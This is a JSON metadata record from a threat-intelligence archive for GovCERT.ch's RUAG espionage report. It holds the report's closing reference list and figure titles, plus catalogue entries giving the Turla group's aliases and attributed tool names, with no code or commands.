https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbugattack-group.pdf\n\n  - http://www.kaspersky.com/about/news/virus/2014/Unraveling-mysteries-of-Turla-cyber-espionagecampaign\n\n  - http://artemonsecurity.com/uroburos.pdf\n\n  - https://blog.gdatasoftware.com/2015/01/23926-analysis-of-project-cobra\n\n  - http://www.symantec.com/connect/blogs/turla-spying-tool-targets-governments-and-diplomats\n\n### List of Figures\n\n1 Chronology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\n\n2 The Turla Family . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n\n3 Attack Phases . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n\n4 Chain of Infection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\n\n5 Turla Timeline . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8\n\n6 Tavdig Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\n\n7 Task Format . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\n\n8 Botnet Hierarchy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n\n9 RSA in Carbon-DLL . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\n\n10 Symmetric Encryption in Carbon-DLL . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\n\n11 1024 Bit Addition . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\n\n12 1024 Bit Multiplication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18\n\n13 1024 Bit Multiplication Corrector . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\n14 1024 Bit Exponentiation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n\n15 ElGamal Decryption . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n\n16 Proxy Tier Topology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\n\n17 CC Servers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\n\n18 DataExfiltration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26\n\n19 Requests . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/rabwkf8pmoxndj0n0nlktvc2eti2381k",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.05.23.APT_Case_RUAG/Report_Ruag-Espionage-Case.pdf",
        "https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf"
    ],
    "report_names": [
        "GovCERTch_Report_Ruag_Espionage_Case(5-23-16)",
        "Report_Ruag-Espionage-Case",
        "Report_Ruag-Espionage-Case.pdf"
    ],
    "threat_actors": [
        {
            "id": "dfee8b2e-d6b9-4143-a0d9-ca39396dd3bf",
            "created_at": "2022-10-25T16:07:24.467088Z",
            "updated_at": "2025-03-27T02:02:10.241387Z",
            "deleted_at": null,
            "main_name": "Circles",
            "aliases": [],
            "source_name": "ETDA:Circles",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1463660515,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/dbee63b0f8cd29139b4d12b867e3a80de139c0df.pdf",
        "text": "https://archive.orkl.eu/dbee63b0f8cd29139b4d12b867e3a80de139c0df.txt",
        "img": "https://archive.orkl.eu/dbee63b0f8cd29139b4d12b867e3a80de139c0df.jpg"
    }
}